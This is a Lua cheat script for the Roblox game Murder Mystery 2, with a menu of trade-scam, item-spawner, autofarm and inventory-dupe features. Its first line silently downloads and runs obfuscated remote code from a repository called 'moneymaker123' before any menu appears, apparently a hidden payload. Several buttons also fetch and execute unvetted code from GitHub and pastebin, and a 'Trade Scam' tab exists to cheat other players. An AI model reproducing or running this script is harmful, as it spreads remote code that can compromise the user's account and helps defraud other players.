-- Initial loadstring
loadstring(game:HttpGet('https://raw.githubusercontent.com/hoodratmiyaa/moneymaker123/refs/heads/main/Protected_9347089653155243.lua.txt'))()

-- Load the DrRay library
local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()

-- Create the Main Window
local window = DrRayLibrary:Load("🎉 MM2 Trade and Features 🎆", "Dark")

-- Notify Function
local function notify(message)
    game.StarterGui:SetCore("SendNotification", {
        Title = "Notification",
        Text = message,
        Duration = 5
    })
end

-- Trade View Tab
local tradeTab = DrRayLibrary.newTab("Trade View", "TradeIconImageIdHere")

-- Toggle state for the Trade View loadstring
local tradeScriptEnabled = false

-- Function to toggle the Trade View loadstring script
local function toggleTradeScript()
    tradeScriptEnabled = not tradeScriptEnabled
    if tradeScriptEnabled then
        loadstring(game:HttpGet('https://raw.githubusercontent.com/hoodratmiyaa/moneymaker123/refs/heads/main/trading.lua'))()
        notify("Trade View Enabled")
    else
        notify("Trade View Disabled")
    end
end

-- Add Toggle for Trade View
tradeTab.newToggle("Enable Trade View", "Toggle the Trade View feature", false, function(state)
    toggleTradeScript()
end)

-- Add Button to Refresh Trade View
tradeTab.newButton("Refresh Trade View", "Reloads the Trade View tab", function()
    if tradeScriptEnabled then
        toggleTradeScript() -- Disable first
        wait(0.5) -- Small delay for reload
        toggleTradeScript() -- Re-enable
        notify("Trade View refreshed.")
    else
        notify("Enable Trade View before refreshing.")
    end
end)

-- Trade Scam Tab
local scamTab = DrRayLibrary.newTab("Trade Scam", "ScamIconImageIdHere")

-- Toggle state for Trade Scam feature
local tradeScamEnabled = false

-- Function to toggle Trade Scam
local function toggleTradeScam()
    tradeScamEnabled = not tradeScamEnabled
    if tradeScamEnabled then
        notify("Trade Scam Enabled")
        -- Add trade scam logic here
        loadstring(game:HttpGet("https://raw.githubusercontent.com/your-repo/trade-scam/main/script.lua"))()
    else
        notify("Trade Scam Disabled")
        -- Optionally, include logic to stop/disable the scam here
    end
end

-- Add Toggle for Trade Scam
scamTab.newToggle("Enable Trade Scam", "Enable or disable trade scam features", false, function(state)
    toggleTradeScam()
end)

-- Add Button to Execute Custom Scam Logic
scamTab.newButton("Execute Scam", "Runs trade scam logic manually", function()
    if tradeScamEnabled then
        -- Add custom scam logic execution
        notify("Trade scam logic executed.")
    else
        notify("Enable Trade Scam first.")
    end
end)

-- Spawner Tab
local spawnerTab = DrRayLibrary.newTab("Spawner", "SpawnerIconImageIdHere")

-- Item List for Spawning
local itemList = {
    "Harvester",
    "Gingerscope",
    "Icepiercer",
    "VampireGun",
    "VampireAxe",
    "TravelerAxe",
    "Spirit",
    "ChromaWatergun",
    "Bauble",
    "ConstellationChroma",
    "Constellation",
    "BaubleChroma",
    "TreeGun2023",
    "TreeKnife2023",
    "TreeKnife2023Chroma",
    "TreeGun2023Chroma"
}
local selectedItem = nil

-- Add Dropdown for Item Selection
spawnerTab.newDropdown("Select Item", "Select an item to spawn", itemList, function(selectedOption)
    selectedItem = selectedOption
    notify("Selected Item: " .. selectedOption)
end)

-- Function to validate the selected item
local function isValidItem(item)
    for _, validItem in ipairs(itemList) do
        if validItem == item then
            return true
        end
    end
    return false
end

-- Add Button to Spawn Selected Item
spawnerTab.newButton("🎆 Spawn Item", "Spawns the selected item", function()
    if selectedItem and isValidItem(selectedItem) then
        local replicatedStorage = game:GetService("ReplicatedStorage")
        local boxController = replicatedStorage:WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("BoxController")
        
        boxController:Fire("Christmas2024Box", selectedItem)
        notify("Spawned Item: " .. selectedItem)
    else
        notify("Invalid or no item selected!")
    end
end)

-- Add Toggle for Autofarm
spawnerTab.newToggle("Enable Autofarm", "Automatically farms items", false, function(toggleState)
    if toggleState then
        notify("Autofarm Enabled")
        loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
    else
        notify("Autofarm Disabled")
    end
end)

-- Add Slider for Spawn Delay
spawnerTab.newSlider("Spawn Delay", "Adjust the delay between spawns", 1, 10, 5, function(value)
    notify("Spawn delay set to: " .. value .. " seconds")
end)

-- Add "Dupe Inventory" Button
spawnerTab.newButton("🔁 Dupe Inventory", "Duplicates your inventory", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/gknn0VvD"))()
    notify("Dupe Inventory script executed.")
end)

-- Settings Tab
local settingsTab = DrRayLibrary.newTab("Settings", "SettingsIconImageIdHere")

-- Add Toggle for New Year's Theme
settingsTab.newToggle("Enable New Year's Theme", "Toggle the New Year's theme", true, function(toggleState)
    if toggleState then
        notify("New Year's Theme Enabled")
    else
        notify("New Year's Theme Disabled")
    end
end)

-- Add Button to Toggle GUI Visibility
settingsTab.newButton("Toggle GUI Visibility", "Show or hide the GUI", function()
    local visibility = DrRayLibrary.GetVisibility()
    DrRayLibrary.SetVisibility(not visibility)
    notify(visibility and "GUI Hidden" or "GUI Shown")
end)
